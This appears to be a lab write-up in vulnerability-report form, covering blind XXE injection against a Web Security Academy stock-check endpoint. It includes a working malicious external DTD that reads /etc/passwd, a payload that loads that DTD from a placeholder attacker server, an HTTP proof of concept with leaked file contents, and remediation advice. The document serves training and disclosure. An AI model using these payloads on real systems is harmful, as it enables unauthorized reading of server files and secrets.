# Vulnerability Report: Blind XXE Data Exfiltration via Error Messages Using External DTD

**Severity:** Medium  
**CVSS Score:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)  
**Date:** 2026-08-08  
**Target:** variableSub.web-security-academy.net  

## Executive Summary

A blind XML External Entity (XXE) injection vulnerability was identified in the stock check functionality of the application.
The endpoint accepts and parses user-supplied XML but returns no output in the response, making classic XXE file read ineffective.
By loading a malicious external DTD hosted on an attacker-controlled server, it is possible to force the XML parser to throw an error message containing the contents of arbitrary server-side files.
This technique requires no out-of-band callback channel — the leaked data is returned directly in the HTTP error response.

## Vulnerability Details

| Field | Value |
|-------|-------|
| Type | Blind XXE Injection — Error-Based File Exfiltration |
| Endpoint | `POST /product/stock` |
| Method | POST |
| Protection | Regular entity usage blocked — parameter entities in external DTDs not restricted |
| Bypass | Loading a malicious external DTD via parameter entity to trigger error-based data leakage |
| Requirement | Any authenticated session on the platform |
| User Interaction | Not required |

## Steps to Reproduce

1. Navigate to any product page and intercept the "Check stock" request in a proxy tool.
2. Observe the request body is XML: `<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>`
3. Host the following malicious DTD on an attacker-controlled server as `/malicious.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///doesnotexist/%file;'>">
%eval;
%exfil;
```
4. Send the following payload to the stock check endpoint:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://ATTACKER-SERVER/malicious.dtd">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```
5. Observe the error response — it contains the full contents of `/etc/passwd`.

## Proof of Concept

```http
POST /product/stock HTTP/2
Host: variableSub.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://ATTACKER-SERVER/malicious.dtd">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

**Response (truncated):**  
java.io.FileNotFoundException: /doesnotexist/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

## Impact

An attacker with a valid session can read any file accessible to the server process.
This includes system files such as `/etc/passwd`, application configuration files, environment variable files containing secrets, and private keys.
No out-of-band infrastructure is required — the leaked content is returned directly in the error response, making this trivially exploitable in a single request chain.

## Remediation

- Disable external DTD processing and external entity resolution entirely in the XML parser configuration
- If XML input is required, use a hardened parser configuration that rejects DOCTYPE declarations by default
- Do not rely solely on blocking regular entity usage — parameter entities in external DTDs are a separate parser mechanism and must be restricted independently
- Consider replacing XML-based endpoints with JSON where external entity processing is not a concern
- Apply input validation and allowlisting on all XML input before it reaches the parser

## References

- OWASP: XML External Entity Prevention Cheat Sheet
- CWE-611: Improper Restriction of XML External Entity Reference
- CWE-776: Improper Restriction of Recursive Entity References in DTDs
- PortSwigger: Blind XXE with Data Retrieval via Error Messages